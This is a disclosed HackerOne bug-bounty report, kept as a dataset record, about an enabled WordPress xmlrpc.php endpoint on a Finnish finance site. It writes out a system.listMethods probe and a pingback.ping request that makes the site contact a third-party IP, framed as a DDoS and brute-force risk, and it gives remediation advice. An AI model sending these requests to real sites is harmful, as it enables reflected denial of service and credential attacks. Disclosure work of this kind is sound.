---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '325040'
original_report_id: '325040'
title: xmlrpc.php FILE IS enable it will used for bruteforce attack and denial of
  service
weakness: Uncontrolled Resource Consumption
team_handle: localtapiola
created_at: '2018-03-12T17:07:49.069Z'
disclosed_at: '2018-04-09T20:48:16.886Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: www.lahitapiolarahoitus.fi
asset_type: URL
max_severity: none
tags:
- hackerone
- uncontrolled-resource-consumption
---

# xmlrpc.php FILE IS enable it will used for bruteforce attack and denial of service

## Metadata

- HackerOne Report ID: 325040
- Weakness: Uncontrolled Resource Consumption
- Program: localtapiola
- Disclosed At: 2018-04-09T20:48:16.886Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

hy

https://www.lahitapiolarahoitus.fi is wordpress site

Wordpress  that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://www.lahitapiolarahoitus.fi has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. See screenshot 2:
POST /xmlrpc.php HTTP/1.1
Host: www.lahitapiolarahoitus.fi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 137

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>


Notice that a successful response is received showing that the xmlrpc.php file is enabled.
Now, considering the domain www.lahitapiolarahoitus.fi, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.

POST /xmlrpc.php HTTP/1.1
Host: www.lahitapiolarahoitus.fi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 291

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://173.243.56.36/</string></value>
</param>
<param>
<value><string>https://www.lahitapiolarahoitus.com/</string></value>
</param>
</params>
</methodCall>
As soon as the above request is sent, the victim host (173.243.56.36) gets an entry in its log file with a request originating from the www.lahitapiolarahoitus.fi domain verifying the pingback.

remediation:

If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.

thanks 

note: screenshots are given below

## Impact

This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.

this method is also used for brute force attacks to stealing the admin credentials and other important credentials

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
